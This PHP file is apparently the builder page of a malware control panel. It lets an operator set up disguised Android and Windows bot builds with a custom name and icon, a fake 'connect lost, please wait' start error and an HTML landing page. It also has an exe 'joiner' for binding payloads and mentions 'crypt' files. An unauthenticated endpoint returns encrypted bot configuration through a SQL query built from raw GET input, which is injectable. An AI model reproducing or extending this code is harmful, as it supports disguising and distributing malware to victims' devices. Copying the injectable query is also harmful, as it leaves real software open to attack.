<?php
	include "config.php";
	
	if($_GET['op']=="getconfig"){
		$uid = $_GET['uid'];
		if($uid>0){
			$sql = "select params from users where id='".$uid."'";
			$res = $dbm->query($sql);
			if($dbm->count>0){
				while($row=mysqli_fetch_array($res)) {
					echo $rc->Encrypt($row[0]);
				}
			}
		}
		die();
	}
	
	if($_POST['op']!=""){
		switch($_POST['op']){
			case "andsetupbot"://htmlstart
				set_user_param("and_bot_name",$_POST['name']);
				$ico = file_get_contents($_FILES['ico']['tmp_name']);
				$htmlstart = file_get_contents($_FILES['htmlstart']['tmp_name']);
				$ico = base64_encode($ico);
				set_user_param("and_bot_ico",$ico);
				
				set_user_param("and_bot_start_msg_error",$_POST['and_bot_start_msg_error']);
				
				set_user_param("and_bot_htmlstart",$htmlstart);
				
				set_user_param("and_bot_update_flag",0);
				notification_add("Update compile bot info","settings.php",1);
				break;
			case "winsetupbot":
				//set_user_param("win_bot_name",$_POST['name']);
				$ico = file_get_contents($_FILES['ico']['tmp_name']);
				$ico = base64_encode($ico);
				set_user_param("win_bot_ico",$ico);
				set_user_param("win_bot_update_flag",0);
				notification_add("Update compile bot info","settings.php",1);
				break;
		}
		
		header("Location: builder.php");
		die();
	}
	
	print_header();
	
	print_menu();
	
	$html = "
	
	<div class=\"row\">
    <div class=\"col-lg-6\">
     
	  <br>
	  <div class=\"panel panel-default\">
	  
		<div class=\"panel-heading\">Android build settings (";
			if(get_user_param("and_bot_update_flag")=="0" || get_user_param("and_bot_update_flag")==""){
				$html .= "<font color=red>wait new build with new param</font>";
			}else{
				$html .= "<font color=green>Android build updated</font>";
			}
		$html .=")</div>
	  
		<div class=\"panel-body\">
		  <form action=\"builder.php\" method=\"post\" enctype=\"multipart/form-data\">
		     <input type=hidden name=op value=andsetupbot>
			<div class=\"form-group\">
			  <input type=\"text\" class=\"form-control\" id=\"email\" placeholder=\"name : example install\" name=\"name\" value=\"".get_user_param("and_bot_name")."\">
			</div>
			<div class=\"form-group\">
			  <input type=\"text\" class=\"form-control\" id=\"email\" placeholder=\"msg start error : connect lost, please wait\" name=\"and_bot_start_msg_error\" value=\"".get_user_param("and_bot_start_msg_error")."\">
			</div>
			<div class=\"form-group\">
			  ";
			  $ico = get_user_param("and_bot_ico");
			  //var_dump($kernel);
			  if(strlen($ico)>0){
				  $html .= "<img src=\"data:image/png;base64, ".$ico."\" alt=\"bot icon\">";
			  }
			  $html .="Icon
			  <input type=\"file\" class=\"form-control\" id=\"email\" placeholder=\"install\" name=\"ico\"><br>
			  Html start landing
			  <input type=\"file\" class=\"form-control\" id=\"email\" placeholder=\"install\" name=\"htmlstart\">
			</div>
			<button type=\"submit\" class=\"btn btn-default\">Save!</button> P.S. update applyed for next uploaded crypt file...
		  </form>
		  
		  </div>
	</div>
	
	<br>
	  <div class=\"panel panel-default\">
	  
		<div class=\"panel-heading\">Windows build settings (";
			if(get_user_param("win_bot_update_flag")=="0" || get_user_param("win_bot_update_flag")==""){
				$html .= "<font color=red>wait new build with new param</font>";
			}else{
				$html .= "<font color=green>Windows build updated</font>";
			}
		$html .=")</div>
	  
		<div class=\"panel-body\">
		  <form action=\"builder.php\" method=\"post\" enctype=\"multipart/form-data\">
		     <input type=hidden name=op value=winsetupwinbot>
			<div class=\"form-group\">
			  ";
			  $ico = get_user_param("win_bot_ico");
			  //var_dump($kernel);
			  if(strlen($ico)>0){
				  $html .= "<img src=\"data:image/png;base64, ".$ico."\" alt=\"bot icon\">";
			  }
			  $html .="
			  <input type=\"file\" class=\"form-control\" id=\"email\" placeholder=\"install\" name=\"ico\">
			</div>
			<button type=\"submit\" class=\"btn btn-default\">Save!</button> P.S. update applyed for next uploaded crypt file...
		  </form>
		  
		  </div>
	</div>  
	
	<br>
	  <div class=\"panel panel-default\">
	  
		<div class=\"panel-heading\">Joiner exe</div>
	  
		<div class=\"panel-body\">
		  <form action=\"builder.php\" method=\"post\" enctype=\"multipart/form-data\">
		     <input type=hidden name=op value=joinexe>
			<div class=\"form-group\">
				<img src=\"data:image/png;base64, ".$ico."\" alt=\"bot icon\">
			  <input type=\"file\" class=\"form-control\" id=\"email\" placeholder=\"install\" name=\"exe\">
			</div>
			<button type=\"submit\" class=\"btn btn-default\">Generate!</button>
		  </form>
		  
		  </div>
	</div>  
	  ";
	  
	 
	  $html .= "
	  
	  </div>
	  
	  
	  
	  
	  
	  </div>
	  
	";

	print_content("Builder",$html);
	
	print_footer();
?>
